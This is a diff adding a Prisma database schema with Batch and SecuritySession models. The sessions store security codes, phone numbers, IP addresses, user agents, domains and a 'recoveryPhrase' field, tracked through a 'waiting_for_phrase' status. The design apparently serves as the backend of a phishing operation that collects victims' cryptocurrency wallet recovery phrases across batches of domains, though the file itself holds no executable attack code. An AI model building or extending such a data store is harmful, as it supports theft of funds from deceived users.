@@ -1,0 +1,36 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?
+// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init
+
+generator client {
+  provider = "prisma-client-js"
+  output   = "../src/generated/prisma"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model Batch {
+  id        String            @id @default(cuid())
+  name      String            @unique
+  createdAt DateTime          @default(now())
+  sessions  SecuritySession[]
+}
+
+model SecuritySession {
+  id             String   @id @default(cuid())
+  securityCode   String   @unique // This would be "Y7176" in your example
+  phoneNumber    String // This would be "+1234567890" in your example
+  ipAddress      String?
+  userAgent      String?
+  domain         String?
+  createdAt      DateTime @default(now())
+  recoveryPhrase String?
+  status         String   @default("pending") // pending, waiting_for_phrase, completed
+  batchId        String?
+  batch          Batch?   @relation(fields: [batchId], references: [id])
+}
